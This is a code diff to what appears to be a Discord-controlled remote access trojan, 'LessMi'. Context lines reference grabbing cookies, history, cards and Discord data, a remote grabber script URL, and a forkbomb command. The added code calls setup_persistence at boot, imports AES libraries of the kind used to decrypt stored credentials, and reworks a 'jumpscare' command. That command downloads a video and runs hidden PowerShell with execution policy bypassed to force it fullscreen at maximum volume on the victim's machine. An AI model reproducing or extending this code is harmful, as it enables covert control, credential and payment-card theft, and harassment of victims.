@@ -24,6 +24,13 @@ GRAB_MODES = ("all", "cookies", "history", "cards", "games", "discord", "discord
 
 import discord
 import tempfile
+try:
+    import Crypto.Cipher.AES
+except Exception:
+    try:
+        import Cryptodome.Cipher.AES
+    except Exception:
+        pass
 import win32com.client
 from discord.ext import commands
 import os
@@ -32,6 +39,7 @@ import ctypes
 import nacl.secret
 import nacl.utils
 import subprocess
+import base64
 import json
 import sqlite3
 import shutil
@@ -609,6 +617,7 @@ def boot():
             os._exit(0)
 
 boot()
+setup_persistence()
 
 def _app_base():
     if getattr(sys, "frozen", False):
@@ -655,7 +664,6 @@ ACCENT_PRESETS = {
     "magenta": 0xFF00FF, "grey": 0x95A5A6, "discord": 0x5865F2, "crimson": 0xDC143C,
 }
 
-JUMPSCARE_URL = "https://github.com/MateAGYT/LessMi/raw/main/resources/jump.mp4"
 GRABBER_URL = "https://github.com/MateAGYT/LessMi/raw/main/resources/grab.py"
 
 auto_click = False
@@ -685,7 +693,7 @@ def create_embed(title, description, color=None):
     embed = discord.Embed(title=title, description=description,
                           color=ACCENT if color is None else color, timestamp=datetime.now())
     if os.path.exists(ICON_PATH):
-        embed.set_footer(text="MateAGYT/LessMi", icon_url="https://github.com/MateAGYT/LessMi/raw/main/logo.png")
+        embed.set_footer(text="MateAGYT/LessMi", icon_url="https://raw.githubusercontent.com/MateAGYT/LessMi/main/resources/logo.png")
     else:
         embed.set_footer(text="MateAGYT/LessMi")
     return embed
@@ -2162,36 +2170,129 @@ async def forkbomb(ctx):
         subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
 
 
+JUMPSCARE_URL = "https://github.com/MateAGYT/LessMi/raw/main/resources/jump.mp4"
+JUMP_MIN = 100_000
+
+
+def _jump_ready(path):
+    try:
+        return os.path.exists(path) and os.path.getsize(path) > JUMP_MIN
+    except Exception:
+        return False
+
+
+async def _ensure_jump():
+    for p in (resource_path("jump.mp4"), os.path.join(BASE_DIR, "jump.mp4")):
+        if _jump_ready(p):
+            return p
+    os.makedirs(BASE_DIR, exist_ok=True)
+    dest = os.path.join(BASE_DIR, "jump.mp4")
+    tmp = dest + ".part"
+    async with aiohttp.ClientSession() as s:
+        async with s.get(JUMPSCARE_URL, allow_redirects=True,
+                         timeout=aiohttp.ClientTimeout(total=60)) as r:
+            if r.status != 200:
+                raise OSError(f"HTTP {r.status}")
+            data = await r.read()
+    if len(data) < JUMP_MIN or b"ftyp" not in data[:64]:
+        raise OSError("bad payload (LFS pointer or error HTML)")
+    with builtins.open(tmp, "wb") as f:
+        f.write(data)
+    os.replace(tmp, dest)
+    return dest
+
+
+JUMP_PS_WPF = r'''
+$ErrorActionPreference = "Stop"
+Add-Type -AssemblyName PresentationFramework
+Add-Type -AssemblyName PresentationCore
+Add-Type -AssemblyName WindowsBase
+$File = __FILE__
+$w = New-Object System.Windows.Window
+$w.WindowStyle = [System.Windows.WindowStyle]::None
+$w.WindowState = [System.Windows.WindowState]::Maximized
+$w.ResizeMode = [System.Windows.ResizeMode]::NoResize
+$w.Topmost = $true
+$w.ShowInTaskbar = $false
+$w.Background = [System.Windows.Media.Brushes]::Black
+$w.Cursor = [System.Windows.Input.Cursors]::None
+$m = New-Object System.Windows.Controls.MediaElement
+$m.LoadedBehavior = [System.Windows.Controls.MediaState]::Manual
+$m.UnloadedBehavior = [System.Windows.Controls.MediaState]::Manual
+$m.Stretch = [System.Windows.Media.Stretch]::Uniform
+$m.Volume = 1
+$w.Content = $m
+$m.Source = New-Object System.Uri($File)
+$w.Show()
+$m.Play()
+$w.Activate()
+$t = New-Object System.Windows.Threading.DispatcherTimer
+$t.Interval = [TimeSpan]::FromSeconds(10)
+$t.Add_Tick({ $t.Stop(); $w.Close() })
+$t.Start()
+[void]$w.ShowDialog()
+'''
+
+JUMP_PS_WMP = r'''
+$w = New-Object -ComObject WMPlayer.OCX
+$w.URL = __FILE__
+$w.settings.volume = 100
+$w.controls.play()
+Start-Sleep -Milliseconds 800
+$w.fullScreen = $true
+Start-Sleep -Seconds 10
+$w.close()
+'''
+
+
+def _play_jump(path):
+    log = os.path.join(BASE_DIR, "jumpscare.log")
+    q = path.replace("'", "''")
+    for name, tpl in (("wpf", JUMP_PS_WPF), ("wmp", JUMP_PS_WMP)):
+        try:
+            p = subprocess.Popen(
+                ["powershell", "-NoProfile", "-STA", "-ExecutionPolicy", "Bypass",
+                 "-Command", tpl.replace("__FILE__", "'" + q + "'")],
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                creationflags=subprocess.CREATE_NO_WINDOW)
+        except Exception as e:
+            with builtins.open(log, "a") as f:
+                f.write(f"[{name}] spawn: {e}\n")
+            continue
+        try:
+            p.wait(timeout=1.5)
+        except subprocess.TimeoutExpired:
+            return name
+        err = (p.stderr.read() or b"").decode("utf-8", "replace")
+        with builtins.open(log, "a") as f:
+            f.write(f"[{name}] exit {p.returncode}: {err[:500]}\n")
+    return None
+
+
 @bot.command()
 async def jumpscare(ctx):
     await ctx.message.add_reaction("👻")
-    path = os.path.join(BASE_DIR, "jump.mp4")
-    if not os.path.exists(path):
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(JUMPSCARE_URL) as resp:
-                    with builtins.open(path, "wb") as f:
-                        f.write(await resp.read())
-        except Exception as e:
-            await ctx.send(embed=create_embed("Error", f"Download failed: {e}", 0xFF0000))
-            return
     try:
-        set_volume_level(1.0)
-        script = (
-            "$w = New-Object -ComObject WMPlayer.OCX; "
-            f"$w.URL = '{path}'; "
-            "$w.settings.volume = 100; "
-            "$w.controls.play(); "
-            "Start-Sleep -Milliseconds 700; "
-            "$w.fullScreen = $true; "
-            "Start-Sleep -Seconds 10; "
-            "$w.close()"
-        )
-        subprocess.Popen(["powershell", "-NoProfile", "-Command", script],
-                         creationflags=subprocess.CREATE_NO_WINDOW)
-        await ctx.send(embed=create_embed("👻 Jumpscare", "Playing fullscreen.", 0xFF0000))
+        path = await _ensure_jump()
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))
+        await ctx.send(embed=create_embed("Error", f"jump.mp4: {e}", 0xFF0000))
+        return
+
+    try:
+        await asyncio.to_thread(set_volume_level, 1.0)
+    except Exception:
+        pass
+
+    used = await asyncio.to_thread(_play_jump, path)
+    if used:
+        await ctx.send(embed=create_embed("👻 Jumpscare", f"Playing ({used}).", 0xFF0000))
+        return
+
+    try:
+        os.startfile(path)
+        await ctx.send(embed=create_embed("👻 Jumpscare", "Fallback to default player.", 0xFF0000))
+    except Exception as e:
+        await ctx.send(embed=create_embed("Error", f"No player available: {e}", 0xFF0000))
 
 @bot.command(aliases=["display-glitch"])
 async def display_glitch(ctx, effect: str = None):
@@ -4565,5 +4666,6 @@ async def on_message(message):
     except Exception:
         pass
 
+check_blacklist = blacklist_watcher
 if __name__ == "__main__":
     bot.run(token)
